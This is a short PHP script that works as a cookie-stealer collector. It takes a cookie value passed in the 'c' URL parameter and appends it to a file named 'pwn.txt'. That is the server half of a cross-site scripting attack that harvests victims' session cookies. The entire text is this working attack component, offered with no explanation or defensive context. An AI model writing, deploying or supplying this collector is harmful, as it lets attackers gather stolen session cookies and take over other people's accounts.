<?php
    $cookie = $_GET['c'];
    $file = fopen("pwn.txt", 'a');
    fwrite($file, $cookie . "\n\n");
    fclose($file);
?>
